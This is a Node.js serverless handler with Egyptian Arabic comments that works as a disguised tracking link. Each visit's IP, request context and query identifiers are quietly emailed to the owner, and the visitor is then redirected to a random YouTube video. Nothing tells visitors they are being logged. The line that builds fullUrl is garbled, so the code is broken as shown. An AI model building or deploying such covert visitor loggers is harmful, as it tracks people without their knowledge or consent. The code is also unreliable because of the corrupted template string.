// api/index.js
require('dotenv').config();
const { getVisitContext, isPrivateIP, hashSha256, shouldSendForIp } = require('../lib/utils');
const { sendVisitEmail } = require('../lib/email');

// قايمة فيديوهات يوتيوب عشوائية
const YOUTUBE_VIDEOS = [
  'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
  'https://www.youtube.com/watch?v=9bZkp7q19f0',
  'https://www.youtube.com/watch?v=kJQP7kiw5Fk',
  'https://www.youtube.com/watch?v=OPf0YbXqDm0',
  'https://www.youtube.com/watch?v=CevxZvSJLk8',
  'https://www.youtube.com/watch?v=jNQXAC9IVRw',
  'https://www.youtube.com/watch?v=Z0Uh3OJCx3o',
  'https://www.youtube.com/watch?v=kffacxfA7G4',
  'https://www.youtube.com/watch?v=60ItHLz5WEA',
  // أضف اللي إنت عايزه
];

module.exports = async (req, res) => {
  // دعم HEAD requests
  if (req.method === 'HEAD') {
    res.statusCode = 200;
    return res.end();
  }

  if (req.method !== 'GET') {
    res.statusCode = 405;
    return res.end('Method Not Allowed');
  }

  const ctx = getVisitContext(req);

  // ==== الجزء اللي كان بيعمل المشكلة ====
  let qp;
  try {
    const proto = req.headers['x-forwarded-proto'] || 'https';
    const host = req.headers.host || 'localhost';
    // نستخدم path نظيف (بدون favicon.ico وغيره)
    const cleanPath = req.url.split('?')[0]; // نأخذ الجزء قبل الـ query string
    const pathToUse = (cleanPath === '/' || cleanPath === '/index.js' || cleanPath === '') ? '/' : cleanPath;

    const fullUrl = `\( {proto}:// \){host}\( {pathToUse} \){req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : ''}`;
    const urlObj = new URL(fullUrl);
    qp = urlObj.searchParams;
  } catch (err) {
    // لو حصل أي مشكلة في الـ URL (زي طلب favicon.ico من غير host)، نستخدم query params من req.url مباشرة
    qp = new URLSearchParams(req.url.split('?')[1] || '');
  }
  // ========================================

  const payload = {
    utm: {
      source: qp.get('utm_source') || null,
      medium: qp.get('utm_medium') || null,
      campaign: qp.get('utm_campaign') || null,
      term: qp.get('utm_term') || null,
      content: qp.get('utm_content') || null,
    },
    userId: qp.get('userId') || null,
    sessionId: qp.get('sessionId') || null,
  };

  // إرسال الإيميل في الخلفية
  const ip = ctx.clientIP;
  const canSend = shouldSendForIp(ip);
  if (canSend && process.env.EMAIL_TO && process.env.EMAIL_USER && process.env.EMAIL_APP_PASSWORD) {
    (async () => {
      try {
        await sendVisitEmail({ payload, context: ctx });
        console.log(`[EMAIL] sent for ${ip}`);
      } catch (err) {
        console.error('[EMAIL] failed:', err.message);
      }
    })();
  }

  // اختيار فيديو عشوائي
  const randomVideo = YOUTUBE_VIDEOS[Math.floor(Math.random() * YOUTUBE_VIDEOS.length)];

  // ريدايركت فوري
  res.statusCode = 302;
  res.setHeader('Location', randomVideo);
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.end();
};